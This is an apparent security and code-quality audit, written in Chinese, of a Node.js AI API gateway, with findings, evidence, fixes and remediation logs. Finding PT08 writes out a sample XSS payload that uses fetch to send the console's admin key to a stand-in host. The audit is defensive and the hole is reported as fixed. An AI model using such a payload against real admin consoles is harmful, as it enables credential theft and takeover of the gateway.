# Ponytail 审查：ZZCSAPI 全项目

范围：server.js（4218 行）、Dockerfile/docker-compose.yml、config.json 形态（不看密钥内容）、build/* 与 console-redesign.html（独立子代理只读审查）、两份前端文档交叉核对。
方法：加载 Ponytail full 阶梯（YAGNI → 复用 → 标准库 → 原生 → 已有依赖 → 一行 → 最少代码），主审先追完整调用链再下结论，每个发现给 file:line 证据；独立只读审查前端后合并。
**本轮只审查不修复产品代码。**「中/低」是整改优先级，不冒充漏洞利用等级；未发现的缺陷不等于不存在；本轮不是渗透测试。

> **整改记录（2026-09-27，v0.7）**：PT01 / PT03 / PT05 / PT06 / PT07 已全部完成整改（PT03 取方案 (c) 彻底撤 arena，含 chromium 全家桶移除、镜像 1.31GB→203MB，`docs/arena-protocol.md` 留档）；前端独立审查的清理类发现 PT08/PT10/PT11/PT13/PT14/PT15/PT16/PT17/PT18/PT20/PT21 同批落地，详见 §前端独立审查 各条状态。处置明细见 [frontend-console-detailed.md §8.7](./frontend-console-detailed.md)。
> **整改记录（2026-09-27，v0.8）**：**PT02 已取方案 (b) 完成整改**——proxy 对全部 openai 系协议真实生效（探测/测试/聊天经 curl `-x` 转发），实测含死端口拒绝、Clash 探测、流式 SSE 完整回放；PT09/PT12/PT19 登记进 detailed §9 后续可做；**PT04（探测双路径）仍待下次动探测逻辑时顺带收敛**。处置明细见 [frontend-console-detailed.md §8.8](./frontend-console-detailed.md)。
> **整改记录（2026-09-27，v1.0）**：PT01 同主题的**分发场景加固**——原 compose 里写死的固定默认密钥（`ADMIN_KEY`/`GATEWAY_KEY` 都给了公共字符串）等于把每个部署的管理密钥公开在仓库里（谁拿到项目谁就知道），且 `checkAuth` 存在"空 key 就放行"。现改为：默认留空 → **首启自动生成 48 位随机密钥**（打印到容器日志并写回 config.json）+ 控制台「输入管理密钥」登录门（壳页面放行、管理 API 仍每次校验、密钥记忆由 sessionStorage 升为 localStorage）。明细见 [frontend-console-detailed.md §8.10](./frontend-console-detailed.md)。
> **整改记录（2026-09-27，v1.1）**：做「Gemini 多模态（图片）适配」时**顺带实测出 PT23 / PT24 / PT25**——PT23 让 Gemini / Anthropic 两条客户端协议的**非流式请求从来就是 502**，PT24 让**原生 Gemini / Anthropic SDK 直连一律 401**，PT25 让 **Anthropic 的 url 型图片源变成一张空图**（静默丢图的第三种写法）；三个都与会话本次目标无关，但同批修复并各自加了回归。同批落地：Gemini `inlineData`/`fileData` + Anthropic `image`(base64/url) 图片入站转换 + 三条客户端协议共用的「图片能力门」（`IMAGE_CAPABLE_PROTOCOLS`，防止静默丢图）；新增零依赖回归 `test/gemini-multimodal.test.js`（40 项断言）与 `test/gemini-multimodal-e2e.test.js`（22 项断言，真起假上游 + 临时网关）。明细见 §PT23 / §PT24 / §PT25 与 README「含图请求的候选裁剪」。

## 结论

**无需推倒重写、无需引入框架/依赖，也不该拆单文件。**零依赖单文件 + 构建管线 + host-mounted config 是正确的懒架构；鉴权咽喉点干净（每路由先 checkAuth 再 dispatch）。真正要动的是**一个部署面信任边界缺口（PT01，实测已复现）**、一个静默功能陷阱（PT02）、一个有真实成本但没有需求方的休眠特性（PT03）。probeChannel/probeDef 双路径等维护面问题留给下次动探测逻辑时顺手收敛。

## 建议处理项（均未修改）

### PT01 高（信任边界·部署面）：NOAUTH 默认 1 + 端口绑 0.0.0.0，管理面全开

- 证据：[docker-compose.yml:13](../docker-compose.yml) `ZZCSAPI_NOAUTH: ${ZZCSAPI_NOAUTH:-1}`（默认即免鉴权）；[docker-compose.yml:8](../docker-compose.yml) `"8787:8787"` 绑所有网卡；[server.js:194](../server.js) `if (NOAUTH) return true` 先于一切 key 判断短路；[server.js:1240](../server.js) `channelStatusAll` 下发渠道**明文 apiKey**。
- 实测（本机复现，非推断）：`GET /admin/api/status` 无任何凭证 → **200 全量渠道（含上游明文 key）**；`POST /v1/chat/completions` 无凭证 → **200 并真实消耗了上游付费额度**。compose 里的 ADMIN_KEY/GATEWAY_KEY 在 NOAUTH=1 下不起任何作用。
- 影响面：局域网内任何设备可读走全部渠道上游 key、增删改渠道、烧光付费额度；若路由器做过 8787 端口转发则直接暴露公网。
- 最小修复（两行 compose，零代码）：`ports` 改 `"127.0.0.1:8787:8787"`；NOAUTH 默认改 `${ZZCSAPI_NOAUTH:-0}`。你现有全部客户端（console `?key=`、DSH Bearer）都带 key，翻成 0 不破坏任何工作流；若确需局域网访问则保留 0.0.0.0 但必须 NOAUTH=0。
- 最小回归：改后本机 `curl -H "Authorization: Bearer $ZZCSAPI_GATEWAY_KEY"` 网关调用全通、console 正常打开、`docker compose` 健康检查（healthz 免鉴权）不受影响。

### PT02 中：渠道 proxy 字段只对 genspark/codex 生效，其余协议静默忽略 ✅ 已整改（v0.8，方案 b）

- 证据：`wbCurlRequest`（[server.js:796](../server.js)）支持 proxy 参数，但传它的只有 genspark（3395/3401）与 codex（3573/3624/3644/3711）；workbuddy 三处全不传（探测 855、测试 1990、聊天 3208）；generic openai 探测 542（fetch）与 CF 回退 553、generic 聊天 2530/2534（fetch + psHttpRequest，该函数无 proxy 参数）全部直连。
- 观察：静态确认全部调用点。当前 30 渠道只有 genspark 配了 proxy 所以**今天没有实际故障**；但表单 proxy 帮助文案只写「codex / genspark 必填」，未说其他协议填了不生效。给 openai 渠道填 proxy 期待走 Clash（典型场景：agentrouter.org 这类被 DNS 污染的上游）会静默直连然后超时，排查成本高。
- 最小修复（二选一）：(a) 0 行逻辑——`validateChannelDef` 对非 curl 系协议携带 proxy 时返回警告 + 表单帮助注明「仅 codex/genspark 生效」；(b) ~10 行——`curlHttpRequest` 加可选 proxy 参数（curl -x），probeChannel/probeDef/tryOpenAIChannel 三个 generic 点在 `def.proxy` 时改走 curl。ponytail 默认 (a)，真出现需要 proxy 的 openai 渠道再升级 (b)。
- 最小回归：(a) 配 proxy 的 openai 渠道保存时出警告；(b) 探测经代理可达。
- **处置（v0.8）**：取方案 (b) 且复用现成 `wbCurlRequest`（未新造客户端）——tryChannel 聊天出站、probeChannel/probeDef 探测、/admin/api/test 迷你聊天各加代理分支，workbuddy 三处补传第 6 参；帮助文案与 README 同步改为明示生效范围。实机回归按「(b) 探测经代理可达」执行并全绿：死端口代理被拒、Clash 7897 探测 ok（42 模型）、代理渠道流式聊天 SSE 完整回放、非流式 200、直连与 genspark 原链路无回归。过程中实测抓到并修掉一个首版疏漏（代理分支漏设 `respBody` 致流式回放空 body）。明细见 [frontend-console-detailed.md §8.8](./frontend-console-detailed.md)。

### PT03 中·决策项：arena 协议休眠，镜像为它背 1.31GB

- 证据：[Dockerfile](../Dockerfile) `apk add chromium nss freetype harfbuzz ttf-freefont`（注释明说给 arena 浏览器 sidecar）+ `--experimental-websocket`（CDP 用）；config.json 30 渠道协议普查 = openai 20 / notion 7 / notion-agent 1 / workbuddy 1 / genspark 1，**arena 0**；`docker images zzcsapi:local` = **1.31GB**（node:20-alpine 基础约 130MB，大头是 chromium 系）；arena.js/tool-emu.js 每次 boot 都 require（server.js:17-18，加载无害）。
- 观察：arena 是刻意构建、有文档（docs/arena-protocol.md）的完整特性，**不是死代码**；但当前没有渠道用它，1.31GB 镜像体积 + 构建时间是每次部署都在付的真实成本。
- 最小修复（用户决策）：(a) 保留现状（随时能接 arena 渠道）；(b) Dockerfile 用 `ARG ARENA=0` 条件安装 chromium 系（保留协议代码，默认镜像瘦回 ~150MB，要接 arena 时 `--build-arg ARENA=1`）；(c) 彻底撤 arena（同 prism 的先例）。ponytail 立场：YAGNI 不溯及已完成的特性，但 (b) 成本一行、收益每次构建。
- 最小回归：(b) 默认构建后 healthz 正常、genspark/openai/notion 全链路不受影响。

### PT04 低：probeChannel 与 probeDef 双路径

- 证据：probeChannel（[server.js:422-584](../server.js)）逐协议分支 + generic 尾巴（fetch 542 → CF 回退 553 → extractModelIds 570 → 写渠道状态）；probeDef（[server.js:610-736](../server.js)）同样逐协议分支 + generic 尾巴（fetch → CF 回退 720 → extractModelIds）。底层探测 helper 共享（gensparkIsLogin/workbuddyChatProbe/notion*），但分支脚手架与 generic 尾巴是两份。
- 观察：当前两份行为同步（probe-headers 修复落在共享的 probeHeadersForDef，两边同时生效）。漂移风险是结构性的：历史先例 51f2c49（/admin/api/test 漏 prism 分支）就是「一个协议要接 4 个点、漏 1 个」的实例。
- 最小修复：下次动探测逻辑时把 probeChannel 的逐协议分支收敛为「调 probeDef(def) 拿结果 → 只做状态落盘」，约可删 120 行脚手架。不建议现在专门做。
- 最小回归：genspark/workbuddy/notion 三协议各做一次周期探测与表单探测，行为一致。

### PT05 低：probeUrlFor / probeMethodFor / probeHeadersFor 三个单行包装

- 证据：[server.js:737-739](../server.js) 定义，唯一调用方 probeChannel（538/543/544/553）；probeDef 直接用 *Def 变体。`probeMethodFor()` 无参恒返 `'GET'`。
- 最小修复：probeChannel 直接调 `probeUrlForDef(ch.def)` 并内联 `'GET'`，删三个包装。
- 最小回归：一次渠道周期探测与改前一致。

### PT06 低：文档行数漂移

- 证据：[docs/frontend-code-map.md:36](./frontend-code-map.md) server.js 写 ~4400，实测 4218 行。
- 最小修复：改 ~4200。
- 最小回归：无。

### PT07 低：两个已知天花板缺 `ponytail:` 标记

- 证据与观察：
  1. `bumpRoll`（server.js:1384）滚动健康分纯内存，容器重启清零——设计如此但未标注。
  2. 渠道连败 3 次进 `down` 桶后，周期探测成功会立刻清零 consecutiveFail 治愈回池（server.js:574）；坏渠道在滚动样本攒到 5 个之前，每个探测周期最多再被真实流量撞 3 次——**实测复现过**（agentrouter 补样本实验中 roll 冻结在 f=3，65 秒间隔绕开冷却才攒满）。
- 最小修复：各加一行注释——`// ponytail: 内存态重启清零，跨重启记忆写 usage.json byChannel`；`// ponytail: 探测治愈重置熔断，坏渠道靠滚动失败率兜底（≥5 样本降 3 级）`。
- 最小回归：无行为变化。

### PT23 中：非流式路径交给 handler 的 shim 缺 `json()` —— ✅ v1.1 已整改（一行）

- 来源：做「Gemini 多模态」的端到端验证时实测撞到（**不是静态推断**：假上游 + 临时网关实例复现，与图片改动无关的既有 bug）。
- 证据（`server.js`，整改前）：`tryChannel` 非流式成功分支先 `await resp.text()` 读全文（统计用量），
  然后构造 `const shim = { ok, status, headers, text: async () => text }` 交给 `onSuccessNonStream(shim, candidate)`——
  **没有 `json()`**；而 `/anthropic/v1/messages` 与 `/gemini/v1beta/...` 两条路由的 `onSuccessNonStream` 实现里都是
  `const oaiBody = await oai.json()`。于是调用即抛 `TypeError: oai.json is not a function`，被同函数的 `catch` 兜成
  `internal: …` → 记一次渠道失败 + 502 `all channels failed`（**还会把健康渠道推进冷却**）。
- 观察：**流式反而正常**（流式走 `onStreamChunk`，不碰 shim），OpenAI 路由也正常（它只用 `shim.text()`）。
  所以症状是「Gemini/Anthropic 协议 + 非流式（多数客户端的默认模式）= 一律 502，流式却好用」，
  报错文案又只有 `internal: oai.json is not a function`，从客户端看不到根因；极易被当成「上游不支持」。
  本仓库 30 条渠道全是 openai/notion 系（无人用 gemini/anthropic 客户端协议），因此长期未被发现。
- 最小修复：给 shim 补 `json: async () => JSON.parse(text)`（shim 是 fetch `Response` 的替身，就该同时具备两个读法）。
- 最小回归：临时实例 + 假 OpenAI 上游，`POST /gemini/v1beta/models/{m}:generateContent` 与
  `POST /anthropic/v1/messages`（均非流式）→ 200 且响应被正确转成各自协议形态；流式路径与 OpenAI 路由行为不变。
- **处置（v1.1）**：按最小修复落地（`server.js` 非流式 shim 一行），并由 `test/gemini-multimodal.test.js`
  的端到端姊妹脚本（临时实例 + 假上游，一次性验证、不入库）实测 17 项断言全绿。

### PT24 中：`checkAuth` 不认原生 SDK 的鉴权头 —— ✅ v1.1 已整改（数行）

- 来源：真机验证「Gemini 协议能不能带图」时，用 Gemini 原生头 `x-goog-api-key` 打活体网关 → **401 `gateway key required`**（实测，不是推断）。
- 证据（`server.js`，整改前）：`checkAuth` 只匹配 `Authorization: Bearer <key>` 与 `?key=<key>` 两条路径；
  而**官方 SDK 的默认鉴权头各不相同**——Gemini SDK 发 `x-goog-api-key`（另一模式才是 URL 里的 `key=`），
  Anthropic SDK 发 `x-api-key`，只有 OpenAI SDK 恰好是 Bearer。
- 观察：症状是「README 让你把 baseURL 指向网关，但官方 Gemini/Anthropic SDK 复制过去直接 401」，
  而从客户端看只是"密钥不对"，很容易被误判成密钥配置问题。`?key=` 那条路能过，所以"用 curl 拼 URL"的
  自测全绿、掩盖了 SDK 的真实行为（**自测方式与被测对象不一致**的典型）。
- 最小修复：`checkAuth` 在 **gateway 侧**追加两个头判定；管理面**刻意不接受**这两个头，避免把客户端密钥语义混进管理面。
- 最小回归：只带 `x-goog-api-key` / `x-api-key` 调 `/gemini/*` `/anthropic/*` → 200；错误值 → 401；
  管理面带这两个头 → 仍 401、Bearer 仍 200（**无提权**）；`NOAUTH=1` 行为不变。
- **处置（v1.1）**：按最小修复落地，3 项头判定 + 1 处管理面隔离；回归进 `test/gemini-multimodal.test.js` §6（8 项断言，含管理面无提权）。

### PT25 低：Anthropic `source.type='url'` 的图片被拼成空图 —— ✅ v1.1 已整改

- 来源：用户追问"图片到底能不能用"时复核三种协议的图片源，发现 `anthropicToOpenAI` 只处理 base64 形态。
- 证据（`server.js`，整改前）：`imageParts.push({ image_url: { url: 'data:' + (b.source?.media_type || 'image/png') + ';base64,' + (b.source?.data || '') } })`——
  Anthropic 的 `{type:'url', url}` 源没有 `data` 字段 ⇒ 拼出 `data:image/png;base64,`（**一张空图**），
  比直接报错更隐蔽：上游收到空图后照样回答，用户以为图片发送成功了。
- 最小修复：按 `source.type` 分流——`url` 型透传直链；`base64` 型拼 data URL；两种都没有（空 source）则**不产出任何 block**。
- 最小回归：base64 源 mime 原样保留、url 源成直链、空 source 不产图片块，且该形态能被「图片能力门」正确识别（`test/gemini-multimodal.test.js` §5）。
- **处置（v1.1）**：按最小修复落地。

## 已验证的非问题（记录在此，避免后人重查）

- **usage.json 无增长问题**（曾疑 byDay/hourly 无界）：recent 封顶 800、byDay 每日仅 1 条、hourly 固定 24 桶（server.js:1471），实测文件 ~8.7K 行且大体平稳；4 秒防抖全量重写在 ~300KB 规模合理。
- **arena-cookie 的 CORS 预检不会被鉴权拦死**（曾疑 OPTIONS 带不上 key）：`?key=` 在预检 URL 里随行，checkAuth 读得到（server.js:202）；1MB 读缓冲（server.js:1514）也有上界。
- **`/admin/status`、`/admin/recheck` 不是死代码**：README:261 明确登记为旧版兼容路径。
- **五个 HTTP 客户端非重复造轮子**：fetch 直连 / psHttpRequestWin（Windows Schannel 过 CF）/ curlHttpRequest（Linux curl 过 CF）/ wbCurlRequest（curl+proxy，genspark/codex 用）/ notionCurlRequest（cookie 链）。各司其职；curlHttpRequest 与 wbCurlRequest 有合并空间但行为风险大，列为观察项不列发现。
- **鉴权咽喉点干净**：每条路由先 checkAuth 再 dispatch（server.js:1162-1222），Bearer 与 `?key=` 双通道都活着；tool id 消毒（2165-2193）是信任边界上的正确防护。
- **estimateTokens 的 CJK 感知启发式**（1336-1346）是恰当的懒实现，有注释有兜底语义。
- **console.log 全部为运维日志**，无调试残留。

## 前端独立审查（子代理只读）

> 方法：`build/app.js` 1862 行全文精读（审查时点，v0.7 整改前）+ console-redesign.html 字典/锚点核对 + build/* 四件套逐行 + 产物抽查 + 机械死函数扫描（121 个定义逐一计引用）。全部为静态分析。与 PT01-07 零重叠。

### PT08 高（信任边界）：onclick 模型名内联可注入 —— ✅ v0.7 已整改（3 处改 data-* + dataset）

- 证据：app.js:528 `openModel('${esc(m.name)}')`（esc 把 `'` 转成 `&#39;`，但 HTML 属性解析时实体先解码回引号，JS 字符串照样逃逸）；app.js:799 `openModel('${m.name}')` **完全裸拼**；app.js:955 `copyCurl('${esc(l.m)}')` 同 528。
- 利用链：模型别名无字符校验（server.js validateChannelDef 只查 models 是对象），来源含「从上游探测更多」——陌生中转站 /models 返回 `x');fetch('//e/'+sessionStorage.adminKey);//` 这类名字，用户勾选加入别名后，点击即在控制台源执行，可偷走 adminKey 调全部 /admin/api。
- 处置：3 处套用仓库 v0.5 已有的 `data-m/data-t="${esc(名字)}" onclick="fn(this.dataset.m)"` 模式（799 处顺带补 esc）。
- 回归：含引号模型名可正常点开/复制。

### PT09 中：URL 来源硬编码 127.0.0.1 全家 —— ⏸ 暂缓（PT01 后紧迫性消失，登记 detailed §9）

- 证据：server.js /admin/api/config 下发 urls 硬编码 `http://127.0.0.1:PORT`，前端五个消费点一律优先 CFG.urls（pgSend 1095/1101、copyModels 436、copyCurl 961、pgCopyCurl 1070、vAccess 端点卡 1191-1199），另有 openModel curl 样例写死 8787（840-844）、SNIP 三段写死（1151-1188）。控制台恒由网关同源提供，`location.origin` 恒更正确（阶梯 4）。v0.5 明确支持局域网 IP 访问的场景下，局域网浏览器里 Playground/copy 全打到访问者本机 127.0.0.1 必挂。
- 暂缓理由：PT01 整改后端口只绑 127.0.0.1，局域网访问本身已不可达，CFG.urls 与真实地址恒一致；若将来恢复局域网访问则必修。

### PT10 中：codex 配额条文档失实（三处同族）—— ✅ v0.7 已整改（删宣称；恢复展示登记 detailed §9）

- 证据：README:120 把「codex 配额条」列为生产独有能力，但新控制台零渲染——`codexQuota`/`notionUsage` 全文仅 adapt 映射行(78)，抽屉/表格均无展示（旧控制台 quotaBox+📊 在 v0.4 重设计时丢失）；code-map:32 把 extra.css 死选择器登记为现行组件；app.js:39 注释宣称配额/用量进 DATA（映射后无消费方）。
- 处置：删 app.js:78 映射行 + 修 39 行注释 + 删 README:120 / detailed §5.1 两处宣称。数据仍在 `/admin/api/status` 下发（server 侧未动），恢复展示时从 git 历史找回 v0.3 quotaBox 实现。

### PT11 中：extra.css 28/38 行死样式 —— ✅ v0.7 已删

- 证据：7 组选择器 5 组零 markup 引用：`th.sortable`(7-10)、`.mini-kv`(12-16)、`.img-out`(18-21)、`.art` 系列(23-31)、`.loading`(33-35)——全源 grep 零命中，仅产物原样携带；活的只有 `.chip.codex` 和 `.kv dd.mono`。误导读者以为 Playground 有生图/工件预览。
- 回归：页面视觉零变化（本就无元素命中）；extra.css 38→8 行，JS 偏移 +648→+617 已全文档同步。

### PT12 中：模型页协议页签语义三重矛盾 —— ⏸ 暂缓（纯展示层，登记 detailed §9）

- 证据：后端 aggregateModels 对三入口统一收全部协议别名（server.js aliasedProto 单表），页面副标自己写「三套端点共用同一份别名表」(744)，但页签按渠道协议过滤且 openai 页签排除表是拍脑袋的（排 notion/workbuddy/genspark/notion-agent）——genspark 专属别名明明能从 /v1 调用却被 OpenAI 页签隐藏，Anthropic/Gemini 页签只显示同名协议渠道、严重少报。

### PT13 低：「按实际选中顺序」文案失实 —— ✅ v0.7 已改文案

- 证据：openModel 抽屉标题「调度优先级（按实际选中顺序）」与 Playground 候选 chips 编号都基于 m.chans = adapt() 按 config 渠道序构建，真实调度序是服务端按 health/effPriority/latency 排——展示顺序与实际调度无关，误导排障。
- 处置：抽屉标题改「来源渠道（按 config 渠道序，非实时调度序）」、Playground 标签「候选渠道」→「来源渠道」。

### PT14 低：reprobe 写入无人读的 errText —— ✅ v0.7 已归位

- 证据：app.js:718 reprobe 把探测错误写进 c.errText，但渠道形状是 lastError（77 行），errText 全文无读取方；且渠道 lastError 在新控制台全程不展示。
- 处置：改写 c.lastError（数据归位）；抽屉渲染 lastError 登记 detailed §9。

### PT15 低：IC.arrowDown 唯一零引用图标 —— ✅ v0.7 已删

### PT16 低：openLog 静默回退错误记录 —— ✅ v0.7 已修

- 证据：app.js:924 找不到 id 时静默回退 `||DATA.logs[0]`——8 秒轮询刷新后点旧行，会展示错误的另一条记录且无提示。
- 处置：找不到时 `return toast('该记录已被轮询刷新移除…')`。

### PT17 低：protoLabel 与 PROTO_META.label 两套协议显示名 —— ✅ v0.7 已补 codex 短名

- 证据：protoLabel（8 项缺 codex）与 PROTO_META.label（9 项含 codex）同文件并存——codex 渠道 chip 显示裸 'codex' 而表单下拉显示「Codex 订阅反代」，同屏两种叫法；vChannels 副标(566) 还写死 6 个协议（实际 8）。
- 处置：protoLabel 补 `codex:'Codex'` 短名、副标改 `PROTO_ORDER.length` 动态生成。彻底单一化（protoLabel 从 PROTO_META 派生）涉及初始化顺序（protoLabel 定义在 PROTO_META 之前），留待下次动此处时顺手做。

### PT18 低：全局搜索 placeholder 承诺过载 —— ✅ v0.7 已改文案

- 证据：shell.html:32「搜索渠道、模型、请求 ID…」但实现只搜渠道（chQ=q; go('channels')）。

### PT19 低：主题闪烁 —— ⏸ 暂缓（登记 detailed §9）

- 证据：head.html 默认 data-theme="light"，app.js init 默认 dark——深色用户每次加载先闪一帧浅色。修法是 head 内联一行读 localStorage，会增行改 JS 偏移，需同步全部锚点文档，留待专门动 head.html 时做。

### PT20 低：有效优先级角标表达式两处内联重复 —— ✅ v0.7 已补 ponytail: 注释

- 说明：v0.6 刻意单行内联不抽 helper 保锚点（§8.6 已注明）。按 PT07 同款补了 `// ponytail:` 天花板注释，下次动锚点时再抽。

### PT21 低：build.js 行数守卫缺失 —— ✅ v0.7 已加

- 证据：+13/+617 换算捷径依赖 head=21/shell=52 恒定，全靠人肉纪律；已有 `</style>` 自检，加行数断言可让锚点漂移在构建期爆错。
- 处置：build.js 增加行数守卫（head/shell 变行数直接 throw，提示同步 AGENTS.md §1.2 与 code-map）。

### PT22 中：8 秒轮询重绘把模型页搜索词与 Playground 草稿冲掉 —— ✅ v1.0.1 已整改

- 来源：用户报告（「聚合模型里搜索任意模型，一会就刷新了页面，然后搜索的就没了」）。
- 证据（`build/app.js`，整改前）：`setInterval(…,8000)` → `loadAll()` → `render()` 重建当前页整个 `#viewport` DOM；
  `vModels` 的 `<input id="mQ" placeholder="搜索模型名…">` **无 `value=`、无状态变量**，页签把 `class="tab on"` 写死在「全部」；
  `drawMTable()` 遂读 `$('#mQ').value`（重绘后为空）→ 搜索清空、页签跳回。
  对照：`vChannels` 有 `chQ`/`chTab`、`vLogs` 有 `lgRange/lgCh/lgOk/lgQ`（命令式回填）、`vOverview` 有 `ovRange` —— **唯独模型页漏了**。
  `vPlayground` 同族：`#pgInput`/`#pgSys` 草稿与 `#pgModel`/`#pgTemp`/`#pgMax`/`#pgStream` 均无回填（草稿被吞，症状更重）。
- 最小修复：模型页补 `mTab`/`mQ` 状态并在模板回填；Playground 补 `pgDraft`/`pgSysText`/`pgModelSel`/`pgTempV`/`pgMaxV`/`pgStreamOn` 六个状态并回填；
  轮询加两条护栏（`pgBusy` 流式中、视口内输入控件被聚焦时跳过这一拍）。
- 最小回归：真机等 10 秒，模型页搜索词/页签保留、Playground 草稿保留、流式「正在路由」气泡不被抽掉；渠道页/日志页/总览页原行为不变。
- **已固化为自动化回归**：`node test/console-state.test.js`（零依赖，27 项断言，覆盖模型页与 Playground；
  从 `build/app.js` 现抠真实渲染函数跑最小 DOM 桩）。**变异测试 4/4**：四处修复逐个撤掉后测试全部变红，恢复后基线重新变绿。
- 沉淀：code-map §0.2 末尾新增「状态回填约定」（视口内输入控件的值必须存 JS 变量 + 模板回填 + `oninput` 写回）；code-map §8 自测清单加了这条命令。

### 前端已验证的非问题（并入总表，避免后人重查）

- **死函数扫描**：app.js 全部 121 个函数/常量定义逐一计引用，无死函数（`$`/`$$` 为扫描器正则误报）；图标表仅 arrowDown 一项死（已删）。
- **usage.latency 与 hourly 后端确实下发**（server.js /admin/api/usage），总览延迟优先级/环比注释成立。
- **CFG.adminKey 存在**（/admin/api/config 下发）→ 接入页 insecure 检查是活分支非死代码。
- **渠道 id 服务端校验 `[a-zA-Z0-9_-]`** → 16 处 onclick 里 c.id 内插全部安全；reqIdOf 产物 base36、整数索引、常量 kind 同样安全——**onclick 攻击面恰好收敛到 PT08 的 3 处模型名内插**。
- **文档行号锚点三重实测全过**（审查时点）：JS 偏移、CSS 偏移、code-map §5 原型函数锚点九个全中——前端文档行号可信，行数漂移仅 server.js（PT06）。
- **PROTO_META/PROTO_ORDER 原型↔生产逐字节一致**（同步义务已由 AGENTS.md §1.1 硬约束化，属已接受成本）。
- **esc() 在纯文本/属性值语境正确**；copyText 的 execCommand 兜底（局域网 http 下 clipboard 不可用）、reqIdOf 撞号注释、掩码密钥处理均合理。
- **刻意设计确认不报**：红涨绿跌、遮罩不点关、原型演示数据（DATA/REPLIES/hash/simTest/fakeKey/MODEL_POOL/PROBE_POOL）、shell gwHost 默认值（loadAll 会覆盖）。

### 前端总评

「设计稿 + 构建管线」在 Ponytail 视角下是**最简正确形态**：零依赖零框架（原生 select/input/confirm、原生剪贴板+execCommand 兜底、内联 SVG 手写图表、单 modal() 容器复用六种弹窗），46 行构建脚本带针对真实事故的自检，CSS 逐字节复制根治双源漂移。没有未请求的抽象，演示逻辑严格圈在原型文件里。**明确不值得动**：原型/生产 JS 整体去重（会毁掉设计稿「零依赖、可单开」语义）；协议字典跨文件单一化（AGENTS.md 已把同步写成硬约束，抽公共源反而引入 import 基建）；build 管线结构本身。这份代码库欠的主要是**删除**，不是重写——v0.7 已把该删的删掉。
